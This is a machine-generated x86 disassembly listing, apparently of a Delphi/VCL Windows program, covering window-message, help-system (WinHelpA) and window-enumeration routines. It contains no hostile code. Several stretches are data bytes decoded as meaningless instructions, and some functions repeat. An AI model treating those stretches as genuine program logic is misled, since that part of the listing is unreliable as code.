mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_40348c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406a30
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444968
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_437588
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_437748
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_44394c
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43774f
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_404004
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_403fe0
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042a0
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40be44
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042a0
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404540
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042a0
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404540
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_4041c8
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_4042a8
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_444968
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_40348c
push ebp
call sub_4374a4
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042a0
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_4041c8
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_4041c8
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_404360
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_437758
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43782c
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_444968
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437833
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404004
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_43785c
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_437884
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_4378c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4378a8
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x194
mov eax ebx
call sub_444968
push eax
call SendMessageA
sub_4378f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_437915
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43791c
retn
sub_43792c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ ecx + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
jns r-xdata
inc esp
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ edx + edi * 2 ] bl
inc ebx
add [ eax + 0x3c00419e ] bl
sahf
inc ecx
add al dl
popfd
inc ecx
add [ eax ] al
sahf
inc ecx
add ah dl
popfd
inc ecx
add [ eax - 0x5d ] al
inc esp
add [ eax ] dl
lodsb [ esi ]
inc esp
add [ eax - 0x1bffbb55 ] ch
scasb [ edi ]
inc esp
add [ ebx ] cl
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x69746341
outsd
outsb
fdivr [ ecx + 0x43 ]
add [ edi ] al
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
add [ eax - 0x5c000000 ] ah
lahf
inc esp
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
int3
or [ ebx - 0x75170f3c ] al
mov ebx 0xda8bfffc
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
jpe r-xdata
inc ebx
add [ eax + 0x40044 ] al
or [ ebx + 0x74 ] dl
inc ecx
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] eax
xchg esp eax
adc [ eax ] al
jl r-xdata
fild [ 0xffffffffc0830000 ]
loopne r-xdata
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437a84
retn
add bh bh
push 0x10044ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040003 ] al
imul ebp [ esi + 0x74 ] 0x5300408d
push esi
test dl dl
je r-xdata
add [ eax ] al
int3
aas
push es
add [ eax ] al
add eax 0xffffffe0
jmp r-xdata
mov esi eax
xor edx edx
mov eax esi
call sub_44a878
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_4035b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_438266
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43826d
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_437c3c
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_437a1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44a878
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_437a58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_437a7d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437a84
retn
sub_437b28
or [ ebx + 0x43 ] edi
add [ ebx ] dl
jpo r-xdata
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ 0xffffffffc100437b ] bl
jpe r-xdata
adc edi [ ebx + 0x43 ]
cmp ch [ eax ]
jpo r-xdata
jns r-xdata
add al al
dec edi
add cl cl
jpe r-xdata
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
lodsd [ esi ]
add cl dl
jpe r-xdata
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
jl r-xdata
jmp 0xfffffffff143bec7
cmp ch [ eax ]
jpo r-xdata
inc ebx
add cl bl
jpe r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404078
cmp [ ebx + 0x1c ] 0x0
je r-xdata
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437cf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fe0
test edi edi
jne r-xdata
add [ eax ] al
adc [ edi + 0x42 ] al
add [ eax + eax ] bl
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
xchg esp eax
adc [ eax ] eax
fdiv [ eax + eax * 2 ]
add ah cl
push esi
inc eax
add al bl
push esi
inc eax
add ah ch
xor al 0x40
add [ eax ] al
sub bh [ ebx + eax * 2 ]
and al 0x0
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
cld
mov al 0xe
pop edi
add [ eax ] al
add [ eax ] al
add cl ah
jpe r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov ecx 0x9900437a
jpe r-xdata
cmp ch [ eax ]
jpo r-xdata
add [ eax ] al
xchg bx ax
add cl ch
jpe r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437cf8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404360
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ ebx ] al
add al ah
xor al 0x40
add al ch
push esi
inc eax
add [ edx + esi + 0x40 ] al
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jl r-xdata
add cl dh
jpe r-xdata
add [ eax + 0xe004386 ] dh
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
inc eax
add [ ebx + edi * 2 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jl r-xdata
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add cl bh
jpe r-xdata
jns r-xdata
add al al
dec edi
add [ ecx ] al
jpo r-xdata
lodsd [ esi ]
add [ ecx - 0x56ffbc86 ] ah
jpe r-xdata
mov al 0xe
pop edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
add [ ecx - 0x46ffbc86 ] dh
jpe r-xdata
cld
add [ eax ] al
add [ esi - 0x6d ] ah
add [ ecx + 0x300437a ] bl
sub_437c3c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437cf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fe0
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404078
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437cf8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404360
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_437d0c
push ebx
mov ebx eax
mov eax ebx
call sub_43803c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_40564c
sub_437d48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437daf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_437c3c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437db6
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_437dc0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437e48
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_437d34
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404360
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437e4f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
sub_437e5b
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_437ee3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_438580
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437eea
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_437c3c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437e68
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_437ee3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_438580
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437eea
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_437c3c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437ef0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437fe8
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_437c3c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408c10
mov eax ebx
call sub_438580
test al al
je r-xdata
mov ecx sub_437a90
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437fef
lea eax [ ebp - 0x1c ]
call sub_403fe0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_437c3c
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_4384d8
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404034
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_438058
push ebx
mov ebx eax
mov eax ebx
call sub_43803c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_40564c
pop ebx
retn
mov eax rw-data
call sub_40564c
sub_438088
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4380e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4380e7
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_437c3c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_4380f0
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4381e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408bd0
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_437c3c
mov eax ebx
call sub_438580
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4381ed
lea eax [ ebp - 0x110 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404250
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_4384d8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404250
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_438278
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4382f8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_437c3c
mov eax ebx
call sub_438580
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4382ff
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4384d8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_438308
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4383f3
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_438580
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4383fa
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404004
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407f18
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_4384d8
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407f18
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_404034
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_437c3c
mov eax [ ebp - 0x14 ]
call sub_4044a0
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_438408
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408648
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_438463
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408624
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_4384d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404490
xor eax eax
push ebp
push sub_43854e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_4384bc
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438555
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407c40
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_438564
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_438580
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_4384bc
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_438560
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_438564
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_4385dc
sub_4385dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_438659
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43803c
call GetTickCount
mov ebx eax
push 0x0
call sub_406160
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_437c3c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438660
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_438668
push ebx
push esi
test dl dl
